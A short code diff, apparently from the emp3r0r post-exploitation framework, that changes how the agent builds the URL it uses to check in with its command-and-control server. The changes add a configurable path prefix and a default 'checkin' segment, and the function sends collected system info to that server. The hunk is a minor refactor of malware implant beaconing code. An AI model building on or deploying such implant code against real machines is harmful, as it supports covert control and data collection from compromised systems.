@@ -26,14 +26,18 @@ import (
 
 // ReportStatus poll CC server and report its system info
 func ReportStatus(config *def.Config, info *def.Emp3r0rAgent) (err error) {
+	prefix := config.C2Prefix
+	if prefix == "" {
+		prefix = transport.WebRoot
+	}
 	checkinPath := config.CheckInPath
 	if checkinPath == "" {
-		checkinPath = transport.CheckInAPI
+		checkinPath = "checkin"
 	}
 	// If UUID is valid, use it.
 	// If empty, the checkin will fail with 404 because the URL will be incomplete (/api/checkin/),
 	// or the server will reject it. This is intended.
-	reportStatusURL := netutil.JoinURL(def.CCAddress, checkinPath, info.UUID)
+	reportStatusURL := netutil.JoinURL(def.CCAddress, prefix, checkinPath, info.UUID)
 	logging.Printf("Collected system info, now reporting status (%s)", reportStatusURL)
 
 	conn, _, _, err := EstablishC2Connection(reportStatusURL)
